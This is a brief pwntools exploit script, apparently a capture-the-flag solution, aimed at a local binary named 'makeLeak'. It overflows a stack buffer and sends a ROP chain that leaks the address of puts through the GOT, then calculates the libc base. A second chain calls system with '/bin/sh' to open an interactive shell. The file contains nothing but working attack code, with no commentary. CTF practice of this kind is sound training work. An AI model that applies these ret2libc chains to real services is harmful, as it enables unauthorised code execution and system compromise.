#!/usr/bin/python
from pwn import *

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
elf = ELF("./makeLeak",False)

r = process("./makeLeak")

rop = "A"*0x24
rop += flat([elf.plt['puts'],elf.symbols['main'],elf.got['puts']])
r.sendline(rop)

r.recvuntil("week.\n")

libc.address = u32(r.recvline()[:4])-libc.symbols['puts']
print "LIBC: "+hex(libc.address)

rop = "A"*0x24
rop += flat([libc.symbols['system'],0,next(libc.search("/bin/sh\0"))])
r.sendline(rop)

r.interactive()
